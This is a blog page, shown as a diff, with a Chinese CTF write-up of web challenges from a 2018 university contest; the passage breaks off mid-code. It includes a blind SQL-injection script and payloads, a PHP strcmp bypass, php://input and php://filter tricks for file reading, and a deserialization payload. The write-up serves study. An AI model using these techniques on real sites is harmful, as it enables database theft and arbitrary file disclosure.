@@ -1,0 +1,1032 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+  <link rel="manifest" href="/images/manifest.json">
+
+
+  <meta name="msapplication-config" content="/images/browserconfig.xml" />
+
+
+
+  <meta name="keywords" content="ctf," />
+
+
+
+
+
+
+
+
+
+
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018中原工学院网络安全校赛">
+<meta property="og:url" content="http://yoursite.com/2019/01/06/zhongyuangongctf/index.html">
+<meta property="og:site_name" content="绝世狂龙">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-130b657b9909b54d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-68ad515d7227f961.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-29c7c017be90d78c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-2716fa6bf82b0435.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-def057390f7a8d98.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-b5cc416ede8b9ce1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-b163d30ea2fce1b8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-3df3674b435642da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-cc7c37e9ab588631.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-4595111c02d37243.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-4adbb8618b050d20.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-2484e9d91eda840b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-abea305c58e6e071.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-37af4ff67a3e4993.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-300ebcac8bbc7245.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-87c11d00b4b43f69.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-c5da609d05dbd009.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-8b85e1fe1cf2fef6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-f4fe67289e27cd96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-63c71f5e0c4356d0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-a1f4c0160b530d0d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-f1c90510dbcbe322.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-bcc2bb1b265d9c56.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-115c8d3c4607aebe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-53c1f36abea96040.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-0638779c488e22dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-852da84fd884d55c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-c4326655ef5782b8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-4ada66a88c0c2215.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-b2cfda37997538a9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-664d04844f126c73.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-14a47078c07559c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-3b683e2184402dc8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-d000e9ac7892b550.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-a4d2c5fe282de5c6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-c7e3a68898a5ef2c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-01-06T12:19:15.733Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2018中原工学院网络安全校赛">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/9113981-130b657b9909b54d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/01/06/zhongyuangongctf/"/>
+
+
+
+
+
+
+  <title>2018中原工学院网络安全校赛 | 绝世狂龙</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">绝世狂龙</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">今天很残酷，明天更残酷，但后天会很美好！</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            友情链接
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-message">
+          <a href="/message/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            留言
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/06/zhongyuangongctf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="berlin">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/zhenzhen.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="绝世狂龙">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2018中原工学院网络安全校赛</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-06T20:14:59+08:00">
+                2019-01-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="https://upload-images.jianshu.io/upload_images/9113981-130b657b9909b54d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><a id="more"></a><br>趁着周日没事，去瞅一波别人家的校赛。。。emmm,,,,,,</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h3 id="web1签到"><a href="#web1签到" class="headerlink" title="web1签到"></a>web1签到</h3><p>打开后是他们团队的一个宣传主页，不能右键，以为像往常的题一样，看下源代码就行了，结果啥也没有</p>
+<p>然后瞅了一眼响应头，发现问题了<br><img src="https://upload-images.jianshu.io/upload_images/9113981-68ad515d7227f961.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>打开txt后是PHP代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"***"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'repo'</span>])) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (strcmp($_GET[<span class="string">'repo'</span>], $flag) == <span class="number">0</span>) </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'No'</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>题目要求让repo与flag字符串相等就输出flag，显然不可能，因为不知道flag是多少，知道了也不做了，，emm<br>乍看也算是个比较严密的验证逻辑，strcmp()函数也只能处理字符串参数，传个数组进去就能返回false，又由于它与0的比较用的是==而非===（允许类型转换后比较），就满足了这个 if 的条件。Payload：?repo[]=a</p>
+<h3 id="婉儿（sql）"><a href="#婉儿（sql）" class="headerlink" title="婉儿（sql）"></a>婉儿（sql）</h3><p>这题出来就是注入提示<br><img src="https://upload-images.jianshu.io/upload_images/9113981-29c7c017be90d78c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>尝试了一番很多关键字都被过滤了，=、union、database()都不能用，一般的注入都不行，就尝试盲注了<br>smile大菜鸡给的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">39.108.109.85:9001?id=1%26%26if(((select schema_name from information_schema.SCHEMATA limit 0,1) regexp &apos;c&apos;),sleep(5),1) #</span><br></pre></td></tr></table></figure></p>
+<p>然后<br><img src="https://upload-images.jianshu.io/upload_images/9113981-2716fa6bf82b0435.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>看到有报错，尝试用脚本去跑数据库，跑出来的不对,结果提交不对，可能脚本错了，没跑全，直到最后结束，<br><img src="https://upload-images.jianshu.io/upload_images/9113981-def057390f7a8d98.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>什么鬼？这不就是<br><img src="https://upload-images.jianshu.io/upload_images/9113981-b5cc416ede8b9ce1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>payload直接就出库了，，，醉了，，<br>然后各路神仙的骚套路<br>id=1 or exp(~id)<br><img src="https://upload-images.jianshu.io/upload_images/9113981-b163d30ea2fce1b8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>id=1 or linestring(id)<br><img src="https://upload-images.jianshu.io/upload_images/9113981-3df3674b435642da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>id=if(exp(~id),1,2)，，，类似的if(payload,1,2)都可以</p>
+<p>附上脚本，这个可以跑全<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">payload = <span class="string">"select group_concat(schema_name) from information_schema.schemata"</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	<span class="keyword">for</span> j in <span class="string">"qazxswedcvfrtgbnhyujmkiolp1234567890@,!+_"</span>:</span><br><span class="line">		url = f<span class="string">"http://39.108.109.85:9001/?id=if(mid((&#123;payload&#125;),&#123;i&#125;,1) regexp '&#123;j&#125;',1,2)"</span></span><br><span class="line">		r = requests.get(url)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"Your id is 1"</span> in r.text:</span><br><span class="line">			flag += j</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">print</span>(flag)</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9113981-cc7c37e9ab588631.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<h3 id="快一点"><a href="#快一点" class="headerlink" title="快一点"></a>快一点</h3><p>代码审计<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'t'</span>]))&#123;</span><br><span class="line">    $_COOKIE[<span class="string">'bash_token'</span>] = $_GET[<span class="string">'t'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"You need get a 't'"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'sleep'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($_POST[<span class="string">'sleep'</span>]))&#123;              </span><br><span class="line">                                      </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Gime me a number plz.'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_POST[<span class="string">'sleep'</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123;   </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'NoNoNo sleep too short.'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_POST[<span class="string">'sleep'</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'NoNoNo sleep too long.'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        sleep((int)$_POST[<span class="string">'sleep'</span>]);  </span><br><span class="line">        getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>题目要求sleep是个数字，并在2592000和7776000之间，然后sleep这么长时间，给出flag。<br>这题主要考察<code>is_numeric()</code>和<code>int()</code>的区别。前者支持普通数字型、科学记数法型、部分支持十六进制0x型，在<code>is_numeric()</code>支持的形式中，int()不能正确转换十六进制型、科学计数法型。<br>因此可以构造6e6、0x4F1A01。</p>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>想到文件上传，就想到一句话上传文件，然后getshell，常规套路，然后无非就是一些waf的绕过<br>没想到这题真狗啊，没fuzz，，，，<br>常规的不能上传php，等文件，可以上传图片，也可以绕过前端抓包上传带有一句话的图片，但结果过上传啥都显示一句上传成功，没路径，怎么getshell？？<br><img src="https://upload-images.jianshu.io/upload_images/9113981-4595111c02d37243.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9113981-4adbb8618b050d20.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>没路径，就一个js弹窗。。。<br>结束后出题人说的pht<br>真狗啊，上传pht都可以了<br><img src="https://upload-images.jianshu.io/upload_images/9113981-2484e9d91eda840b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>虽然出的题不难，，但是我不会，，，2333真香，，，，不得不说出题人都很有心思啊tql</p>
+<h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><p>打开题后，提示不是admin<br>然后查看源代码<br><img src="https://upload-images.jianshu.io/upload_images/9113981-abea305c58e6e071.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>这里利用到了php伪协议，否则无法的到admin,读取文件。。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))</span><br></pre></td></tr></table></figure></p>
+<p>如何让file_get_contents($user,’r’)===”admin”呢？<br>用php的封装协议php://input，因为php：//input可以得到原始的post数据：<br><img src="https://upload-images.jianshu.io/upload_images/9113981-37af4ff67a3e4993.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>这样便得到了admin的权限<br>然后读取class.php文件，这里用到php的另一个封装协议：php://filter<br>利用这个协议就可以读取任意文件了<br>利用方法：php://filter/convert.base64-encode/resource=index.php<br>这里把读取到的index.php的内容是base4的格式</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9113981-300ebcac8bbc7245.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>解密的源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">        $pass = unserialize($pass);</span><br><span class="line">        <span class="keyword">echo</span> $pass;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后读class.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>有源码来看这是一道反序列化题<br>构造序列化字符串然后传进去读取flag，因为他过滤了flag不能直接读取<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">'php://filter/read=convert.base64-encode/resource=flag.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> 